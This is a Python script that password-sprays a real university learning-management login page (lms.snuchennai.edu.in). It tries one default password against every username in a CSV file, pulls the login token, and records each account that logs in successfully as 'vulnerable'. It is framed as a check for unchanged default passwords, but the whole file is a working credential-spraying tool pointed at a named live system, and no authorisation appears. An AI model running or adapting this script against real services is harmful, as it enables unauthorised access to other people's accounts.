#!./.venv/bin/python
# Python script to find users who still have the default password (as an argument)

import requests
from bs4 import BeautifulSoup

import csv

import sys


url = "https://lms.snuchennai.edu.in/login/index.php"

# Predefined message displayed when login successful and credentials incorrect
# May change in future
WELCOME_MSG = "Welcome to the Learning Management System (LMS) at Shiv Nadar University, Chennai !!"
ERROR_MSG = "Invalid login, please try again"


def checkLogin(response):
    soup = BeautifulSoup(response.text, "html.parser")

    # Check if welcome message is in content
    if WELCOME_MSG == str(soup.p.contents[0].text):  # type:ignore
        return True
    # Check if error message is in alert (id) box
    elif ERROR_MSG == soup.body.select_one(".alert").text:  # type:ignore
        return False
    # Raise exception if something unexpected happens
    else:
        raise Exception("Unknown error")


def login(session, username, password):
    # Get login token from page
    login_token = BeautifulSoup(session.get(url).text, "html.parser").find(
        "input",
        {"name": "logintoken"},  # type:ignore
    )["value"]

    # default login payloads
    data = {
        "anchor": "",
        "logintoken": login_token,
        "username": username,
        "password": password,
    }

    response = session.post(url, data=data)

    return response


# Function to append given username into a report.txt file
def addReport(username):
    with open("report.txt", "a+") as file:
        file.write(username)


# Function to write the returned HTML page in a file with user's name. To be used if unexpected error occurs.
def logUnknownError(username, html):
    with open(username.replace("@snuchennai.edu.in", ""), "w+") as file:
        file.write(html)


# Function to get list of usernames (email id) in a csv format.
# https://stackoverflow.com/a/24662707
def getUsers(filename="users.csv"):
    with open(filename, "r") as file:
        reader = csv.reader(file)
        data = list(reader)
        return data


def main():
    # Abort if default password is not provided as an argument
    try:
        password = sys.argv[1]
    except IndexError:
        print("Provide default password as an argument")
        return

    users = getUsers()[0]

    # Iterate over each username in the list (csv)
    for user in users:
        # Create a new session for each user
        with requests.session() as session:
            loginResponse = login(session, user, password)

        try:
            status = checkLogin(loginResponse)

            # If login success, call addReport function and report in stdout
            if status:
                addReport(user)
                print(f"{user} vulnerable")

            # If login failed, report in stdout
            else:
                print(f"{user} is not vulnerable")

        # Dump returned HTML in case of unexpected error
        except Exception:
            print(f"Exception occured for ${user}")
            logUnknownError(user, loginResponse.text)


if __name__ == "__main__":
    main()
